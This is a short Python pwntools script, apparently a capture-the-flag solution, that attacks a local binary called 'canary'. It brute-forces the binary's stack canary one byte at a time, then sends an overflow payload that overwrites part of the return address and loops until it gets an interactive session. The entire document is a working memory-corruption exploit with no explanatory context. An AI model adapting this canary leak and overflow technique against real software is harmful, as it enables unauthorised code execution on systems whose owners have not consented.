from pwn import *
canary = ''
def leakCanary():
	canary=""
	for i in range(1, 5):
	  for j in range(256):
		s = process('./canary')
		s.sendlineafter('> ', str(32+i))
		s.sendafter('> ', 'a'*32+canary+chr(j))
		output = s.recvline()
		if "*** Stack Smashing Detected *** : Canary Value Corrupt!\n" not in output:
		  canary += chr(j)
		  break
	return canary
def solve(canary):
	payload = 'a'*32
	payload += canary
	payload += 'a'*16
	payload += '\xed'
	payload += '\x87'
	while True:
		try:
			s = process("./canary")
			s.sendline('54')
			s.sendline(payload)
			s.interactive()
			s.close()
			break
		except:
			s.close()
			

canary = leakCanary()
print "your canary: " + canary
solve(canary)

